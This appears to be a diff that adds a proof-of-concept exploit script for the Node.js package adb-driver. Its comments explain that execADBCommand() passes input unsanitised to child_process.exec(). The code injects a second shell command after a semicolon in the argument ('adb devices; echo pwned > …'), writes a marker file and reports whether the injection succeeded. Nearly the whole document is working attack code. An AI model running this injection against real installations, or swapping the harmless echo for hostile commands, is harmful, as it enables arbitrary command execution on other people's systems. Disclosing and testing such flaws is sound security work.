@@ -1,0 +1,30 @@
+```javascript
+// Exploit for adb-driver: execADBCommand() passes a user-supplied string
+// directly to child_process.exec() with no sanitization or escaping,
+// allowing arbitrary shell command injection via metacharacters like ';'.
+
+const { execADBCommand } = require("./node_modules/adb-driver/build/AdbDriver.js");
+const fs = require("fs");
+const os = require("os");
+const path = require("path");
+
+const marker = path.join(os.tmpdir(), "adb_driver_pwned_" + Date.now() + ".txt");
+
+// Legitimate callers expect something like "adb devices", but because the
+// whole string is handed to a shell via child_process.exec(), we can smuggle
+// an arbitrary extra command after a ';'.
+const payload = `adb devices; echo pwned > ${marker}`;
+
+execADBCommand(payload)
+  .catch(() => {}) // ignore errors from the "adb" part (it may not exist)
+  .finally(() => {
+    setTimeout(() => {
+      if (fs.existsSync(marker)) {
+        console.log("[+] Command injection succeeded! Injected file created at:", marker);
+        console.log("[+] Contents:", fs.readFileSync(marker, "utf8").trim());
+      } else {
+        console.log("[-] Injection marker not found (unexpected).");
+      }
+    }, 500);
+  });
+```
